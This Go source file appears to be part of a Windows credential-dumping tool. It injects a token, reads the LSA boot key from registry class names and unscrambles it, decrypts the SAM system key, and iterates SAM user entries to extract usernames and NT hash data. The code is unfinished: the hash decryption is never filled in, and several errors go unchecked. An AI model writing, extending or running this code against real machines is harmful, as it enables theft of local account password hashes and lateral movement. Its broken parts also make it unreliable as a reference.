package lib

import (
	"bytes"
	"fmt"

	"encoding/binary"
	"encoding/hex"

	"github.com/jfjallid/go-smb/smb/encoder"
	"golang.org/x/sys/windows"

	// "strings"
	// "log"
	"golang.org/x/sys/windows/registry"
)


func TestRegAccess(token windows.Token) error {
	err := InjectToken(token)
	if err != nil {
		return err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion`, registry.READ)
	defer  key.Close()

	_, _, err = key.GetStringValue("ProgramFilesDir")
	if err != nil {
		return err
	}
	return nil
}

func DumpSAM(token windows.Token) (error) {
	err := InjectToken(token)
	if err != nil {
		return err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, registry.READ)
	defer  key.Close()
	sub_keys, _ := key.ReadSubKeyNames(-1)
	BootKey, err := GetBootKey(token) // Get Boot Key
	// fmt.Println(BootKey)
	if err != nil {
		return err
	}
	fmt.Println(hex.EncodeToString(BootKey))
	systemKey, err := GetSysKey(token, BootKey)
	fmt.Println(hex.EncodeToString(systemKey))
	for _, k := range sub_keys{
		k = fmt.Sprintf(`SAM\SAM\Domains\Account\Users\%s`, k)
		sub_k, _ := registry.OpenKey(registry.LOCAL_MACHINE, k, registry.READ)
		sub_k_data, _ := sub_k.ReadValueNames(-1)
		sub_k_data_len := len(sub_k_data)
		if sub_k_data_len > 1 {
			v, _, _ := sub_k.GetBinaryValue("V")
			// F, _, _ := sub_k.GetBinaryValue("F")
			offsetName := binary.LittleEndian.Uint32(v[0x0c:]) + 0xcc
			szName := binary.LittleEndian.Uint32(v[0x10:])
			Username, _ := encoder.FromUnicodeString(v[offsetName : offsetName+szName])
			szNT := binary.LittleEndian.Uint32(v[0xac:])
			offsetHashStruct := binary.LittleEndian.Uint32(v[0xa8:]) + 0xcc
			Data := []byte{}
			var offsetIV uint32
			if 0x14 == szNT {
				szNT -= 4
				offsetNT := offsetHashStruct + 4
				Data = v[offsetNT : offsetNT+16]
				
			} else if 0x38 == szNT {
				offsetIV = offsetHashStruct + 8
				offsetNT := offsetHashStruct + 24
				Data = v[offsetIV : offsetNT+16]
			} else if 0x18 == szNT{
				Data = []byte{}
			} else if szNT == 0x4 {
				Data = []byte{}
			}
			var decrypted []byte

			fmt.Printf("%s\\%s\n", Username, hex.EncodeToString(decrypted))

		}
	}
	

	return nil

}
func GetBootKey(token windows.Token) (result []byte, err error) {
	err = InjectToken(token) // inject token
	if err != nil {
		return nil, err
	}

	// Initialize result and scrambled with proper size
	result = make([]byte, 16)
	scrambled := make([]byte, 0, 16)
	
	// Permutation array for unscrambling
	var p []byte = []byte{0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}

	// Open the LSA key
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.READ|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("error opening LSA key: %v", err)
	}
	defer key.Close()

	// Read the values from the registry
	names := []string{"JD", "Skew1", "GBG", "Data"}
	for _, name := range names {
		subKey, err := registry.OpenKey(key, name, registry.READ|registry.QUERY_VALUE)
		if err != nil {
			return nil, fmt.Errorf("error opening subkey %s: %v", name, err)
		}
		defer subKey.Close()

		// Pre-allocate a large enough buffer for the class
		const maxClassSize = 1024 // Larger buffer size
		classBytes := make([]uint16, maxClassSize)
		classLen := uint32(maxClassSize)
		
		// Get the class string with all other parameters
		var subKeyCount, maxSubKeyLen, maxClassLen uint32
		var valueCount, maxValueNameLen, maxValueLen uint32
		var secDescLen uint32
		var lastWriteTime windows.Filetime

		err = windows.RegQueryInfoKey(
			windows.Handle(subKey),
			&classBytes[0],
			&classLen,
			nil,
			&subKeyCount,
			&maxSubKeyLen,
			&maxClassLen,
			&valueCount,
			&maxValueNameLen,
			&maxValueLen,
			&secDescLen,
			&lastWriteTime,
		)
		if err != nil {
			return nil, fmt.Errorf("error getting class for %s: %v", name, err)
		}

		// Convert class to string and decode hex
		class := windows.UTF16ToString(classBytes[:classLen])
		// log.Printf("Raw class string for %s: %s", name, class) // Debug logging

		decoded, err := hex.DecodeString(class)
		if err != nil {
			return nil, fmt.Errorf("error decoding hex from subkey %s: %v", name, err)
		}

		// Debug logging
		// log.Printf("Key %s class decoded (%d bytes): %x", name, len(decoded), decoded)

		scrambled = append(scrambled, decoded...)
	}

	// Verify we have exactly 16 bytes
	if len(scrambled) != 16 {
		return nil, fmt.Errorf("invalid scrambled key length: got %d bytes, want 16", len(scrambled))
	}

	// log.Printf("Scrambled key (%d bytes): %x", len(scrambled), scrambled)

	// Unscramble using the permutation array
	for i := 0; i < 16; i++ {
		if int(p[i]) >= len(scrambled) {
			return nil, fmt.Errorf("permutation index out of range: %d >= %d", p[i], len(scrambled))
		}
		result[i] = scrambled[p[i]]
	}

	bootKey := make([]byte, 16)
	copy(bootKey, result)

	// log.Printf("Boot key: %x", bootKey)

	return bootKey, nil
}
func GetSysKey(token windows.Token, bootKey []byte) ([]byte, error){
	err := InjectToken(token) // inject token
	if err != nil {
		return nil,err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account`, registry.READ)
	defer key.Close()
	Data, _,err := key.GetBinaryValue("F")
	// TODO: Add code to decrypt the system key
	var encSysKey []byte
	var sysKeyIV []byte
	var tmpSys []byte
	sysKey := make([]byte, 16)
	f := &domain_account_f{}
	err = f.unmarshal(Data)
	if f.Revision == 3 {
		// AES
		samAESData := sam_key_data_aes{}
		err = binary.Read(bytes.NewBuffer(f.Data), binary.LittleEndian, &samAESData)
		if err != nil {
			return nil, err
		}
		sysKeyIV = samAESData.Salt[:]
		encSysKey = samAESData.Data[:samAESData.DataLen]
		tmpSys, err  = DecryptAES(bootKey, encSysKey, sysKeyIV)
		copy(sysKey, tmpSys)

	}else{
		err = fmt.Errorf("Unsupported revision %s", f.Revision)
		return nil, err
	}


	return sysKey, err

}